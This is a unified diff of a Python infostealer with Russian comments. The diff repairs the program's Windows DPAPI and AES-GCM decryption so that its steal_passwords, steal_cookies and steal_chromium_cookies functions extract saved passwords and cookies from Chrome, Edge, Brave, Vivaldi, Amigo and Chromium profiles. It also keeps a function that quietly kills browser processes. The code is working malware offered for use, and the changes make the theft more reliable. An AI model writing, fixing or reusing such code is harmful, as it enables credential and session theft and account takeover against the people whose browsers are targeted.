@@ -23,7 +23,7 @@ import sys
 import traceback
 from pathlib import Path
 from Cryptodome.Cipher import AES
-import win32crypt
+from win32crypt import CryptUnprotectData  # Исправленный импорт
 
 # =============================================
 # АВТОМАТИЧЕСКАЯ УСТАНОВКА ЗАВИСИМОСТЕЙ
@@ -87,7 +87,7 @@ BROWSERS = {
     "edge": "Microsoft Edge",
     "brave": "Brave Browser",
     "vivaldi": "Vivaldi Browser",
-    "chromium": "Chromium Browser"  # Добавлен Chromium
+    "chromium": "Chromium Browser"
 }
 
 # Глобальный логгер для отладки
@@ -137,7 +137,8 @@ def chromiumc():
                 
                 # Расшифровка значения куки
                 try:
-                    cookie_value = win32crypt.CryptUnprotectData(encrypted_value)[1].decode()
+                    # Исправленный вызов CryptUnprotectData
+                    cookie_value = CryptUnprotectData(encrypted_value)[1].decode('utf-8')
                 except Exception as e:
                     debug_log(f"Ошибка дешифровки: {e}")
                     cookie_value = "DECRYPT_FAILED"
@@ -162,7 +163,7 @@ def chromiumc():
     return textchc
 
 # =============================================
-# ОСНОВНЫЕ ФУНКЦИИ (ОСТАЛЬНЫЕ БЕЗ ИЗМЕНЕНИЙ)
+# ОСНОВНЫЕ ФУНКЦИИ (С ИСПРАВЛЕННЫМИ ОШИБКАМИ)
 # =============================================
 
 def create_directories():
@@ -248,7 +249,7 @@ def stealthy_kill_browser(browser_name):
         "edge": "msedge.exe",
         "brave": "brave.exe",
         "vivaldi": "vivaldi.exe",
-        "chromium": "chrome.exe"  # Для Chromium
+        "chromium": "chrome.exe"
     }
     
     target_process = process_map.get(browser_name)
@@ -543,7 +544,8 @@ def get_encryption_key(profile_path):
             
         encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
         try:
-            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            # Исправленный вызов CryptUnprotectData
+            key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
             debug_log(f"Ключ успешно получен ({len(key)} байт)")
             return key
         except Exception as e:
@@ -556,10 +558,11 @@ def get_encryption_key(profile_path):
 def decrypt_chromium_value(encrypted_value, key):
     """Улучшенная расшифровка значений для Chromium"""
     try:
-        debug_log(f"Начало дешифровки ({len(encrypted_value)} байт)")
+        # Если нет ключа или значения - возвращаем ошибку
+        if not key or not encrypted_value or not isinstance(encrypted_value, bytes):
+            return "DECRYPTION_FAILED"
         
-        if not encrypted_value or not isinstance(encrypted_value, bytes):
-            return ""
+        debug_log(f"Начало дешифровки ({len(encrypted_value)} байт)")
         
         # Формат v10/v11 (AES-GCM)
         if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
@@ -634,7 +637,7 @@ def steal_passwords():
             "amigo": appdata / "Amigo" / "User Data" / "Default",
             "brave": appdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
             "vivaldi": appdata / "Vivaldi" / "User Data" / "Default",
-            "chromium": appdata / "Chromium" / "User Data" / "Default"  # Добавлен Chromium
+            "chromium": appdata / "Chromium" / "User Data" / "Default"
         }
         
         for browser_name, display_name in BROWSERS.items():
@@ -687,7 +690,7 @@ def steal_cookies():
             "amigo": appdata / "Amigo" / "User Data" / "Default",
             "brave": appdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
             "vivaldi": appdata / "Vivaldi" / "User Data" / "Default",
-            "chromium": appdata / "Chromium" / "User Data" / "Default"  # Добавлен Chromium
+            "chromium": appdata / "Chromium" / "User Data" / "Default"
         }
         
         for browser_name, display_name in BROWSERS.items():
@@ -830,11 +833,11 @@ def steal_chromium_cookies(browser_name, profile_path):
                     host, name, value, path, expires, secure, encrypted_value = item
                     debug_log(f"Обработка куки #{i+1}")
                     
-                    # Приоритет - encrypted_value
-                    if encrypted_value and isinstance(encrypted_value, bytes):
+                    # Если есть ключ и зашифрованное значение - пытаемся расшифровать
+                    if key and encrypted_value and isinstance(encrypted_value, bytes):
                         cookie_value = decrypt_chromium_value(encrypted_value, key)
                     else:
-                        # Если нет encrypted_value, используем обычное значение
+                        # Если нет ключа или зашифрованного значения, используем обычное значение
                         if isinstance(value, bytes):
                             cookie_value = value.decode('utf-8', errors='ignore')
                         else:
@@ -1161,4 +1164,4 @@ if __name__ == "__main__":
     
     # Добавлена пауза в конце программы
     print("Программа завершена. Окно закроется через 60 секунд...")
-    time.sleep(60)  # Пауза 60 секунд перед закрытием окна
+    time.sleep(60)
